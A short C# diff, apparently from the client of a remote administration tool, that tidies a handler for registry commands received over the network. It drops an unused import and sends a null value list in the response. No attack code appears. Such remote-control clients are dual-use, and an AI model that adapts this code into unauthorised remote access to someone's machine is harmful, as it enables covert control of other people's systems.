@@ -5,7 +5,6 @@ using System.Text;
 using xClient.Core.Networking;
 using xClient.Core.Registry;
 using xClient.Core.Extensions;
-using System.Diagnostics;
 using Microsoft.Win32;
 using System.Threading;
 
@@ -66,7 +65,7 @@ namespace xClient.Core.Commands
                 }
                 responsePacket.ErrorMsg = errorMsg;
 
-                responsePacket.Match = new RegSeekerMatch(newKeyName, new List<RegValueData>(), 0);
+                responsePacket.Match = new RegSeekerMatch(newKeyName, null, 0);
                 responsePacket.ParentPath = packet.ParentPath;
 
                 responsePacket.Execute(client);
